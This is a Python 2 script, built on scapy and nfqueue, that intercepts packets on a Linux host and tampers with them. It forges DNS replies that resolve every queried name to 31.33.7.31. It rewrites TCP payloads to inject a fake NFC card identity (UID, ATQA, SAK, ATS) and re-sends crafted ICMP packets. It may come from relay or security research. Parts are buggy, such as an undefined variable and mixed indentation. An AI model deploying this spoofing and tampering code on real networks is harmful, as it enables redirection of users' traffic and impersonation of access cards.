import logging

l=logging.getLogger("scapy.runtime")
l.setLevel(49)

from socket import AF_INET, AF_INET6, inet_ntoa
import os,sys,nfqueue,socket
from scapy.all import *

conf.verbose = 0
conf.L3socket = L3RawSocket

def send_echo_reply(pkt):
		ip = IP()
		icmp = ICMP()
		#ip.src = pkt[IP].dst 
		#ip.dst = pkt[IP].src
		ip.src = pkt[IP].src
		ip.dst = '8.8.8.8'
		icmp.type = pkt[ICMP].type
		icmp.code = pkt[ICMP].code
		icmp.id = pkt[ICMP].id
		icmp.seq = pkt[ICMP].seq
		print "Sending back an echo reply to %s" % ip.dst
		data = pkt[ICMP].payload
		send(ip/icmp/data, verbose=0)

def send_modified_ATS(pkt):
		print "Creatin new packet"
		print "Old payload:"
		old_payload = pkt[Raw].load
		print old_payload
		new_payload = "#UID 0007: 04 2b 0e 92 73 28 80 \n#ATQA 0002: 03 44 \n#SAK 0001: 20 \n#ATS 0005: 75 77 91 02 80 \n"

		print "New payload: \n %s" % new_payload
		print "Sending Modified ATS response"
		pkt[Raw].load = new_payload
		
		modified_payload = pkt[Raw].load
		print "Response has payload: %s" % modified_payload
		
		del new_pkt[IP].chksum
		del new_pkt[TCP].chksum
		#send(pkt, verbose=0)
		pkt.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

def fake_dns_reply(pkt, qname):
		ip = IP()
		udp = UDP()
		ip.src = pkt[IP].dst
		ip.dst = pkt[IP].src
		udp.sport = pkt[UDP].dport
		udp.dport = pkt[UDP].sport
		
		solved_ip = "31.33.7.31"
		qd = pkt[UDP].payload
		dns = DNS(id = qd.id, qr = 1, qdcount = 1, ancount = 1, arcount = 1, nscount = 1, rcode = 0)
		dns.qd = qd[DNSQR]
		dns.an = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = solved_ip)
		dns.ns = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = solved_ip)
		dns.ar = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = solved_ip)
		print "Sending the fake DNS reply to %s:%s" % (ip.dst, udp.dport)
		send(ip/udp/dns)


def process(i, payload):
	data = payload.get_data()
	pkt = IP(data)
	#raw_pkt = Raw(pkt.get_data())
	#raw_pkt = pkt[Raw].load

	proto = pkt.proto
	lenght = len(pkt)
	
	# Dropping the packet
	# payload.set_verdict(nfqueue.NF_DROP)
	
	# Check if it is a ICMP packet
	if proto is 0x01:
			payload.set_verdict(nfqueue.NF_DROP)
			print "It's an ICMP packet"
			# Idea: intercept an echo request and immediately send back an echo reply packet
			if pkt[ICMP].type is 8:
				print "It's an ICMP echo request packet"
				send_echo_reply(pkt)
			else:
				pass
	# Check if it is an UDP packet
	elif proto is 0x11:
		payload.set_verdict(nfqueue.NF_DROP)
		# Check if it is a DNS packet (raw check)
		if pkt[UDP].dport is 53:
			print "It's a DNS request"
			dns = pkt[UDP].payload
			qname = dns[DNSQR].qname
			print "Sir Ping is requesting for %s" % qname
			fake_dns_reply(pkt, qname) 
	# Check if it is an TCP packet
	elif proto is 0x06:
		#print "Found TCP Packet:"
		#print "Calling Function: Modify, now"
		new_pkt = IP(data)
		payload.set_verdict(nfqueue.NF_DROP)
		#send_modified_ATS(pkt)
		
		print "Creatin new packet"
                print "Old payload:"
                old_payload = pkt[Raw].load
                print old_payload
                new_payload = "#UID 0007: 04 2b 0e 92 73 28 80 \n#ATQA 0002: 03 44 \n#SAK 0001: 20 \n#ATS 0005: 75 77 91 02 80 \n"

                print "New payload: \n %s" % new_payload
                print "Sending Modified ATS response"
                new_pkt[Raw].load = new_payload

                modified_payload = new_pkt[Raw].load
                print "Response has payload: %s" % modified_payload

                del new_pkt.chksum
                del new_pkt[TCP].chksum
                send(new_pkt, iface="eth1.100", verbose=0)
                #new_pkt.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
		
	# Else, not handled		
	else:
		print "Protocol not handled!!"
		pass

def main():
	q = nfqueue.queue()
	nqueue = 0
	q.open()
	q.set_callback(process)
	q.fast_open(nqueue, AF_INET)

	try:
		q.try_run()
	except KeyboardInterrupt:
		print "Exiting..."
		q.unbind(socket.AF_INET)
		q.close()
		sys.exit(1)

main()
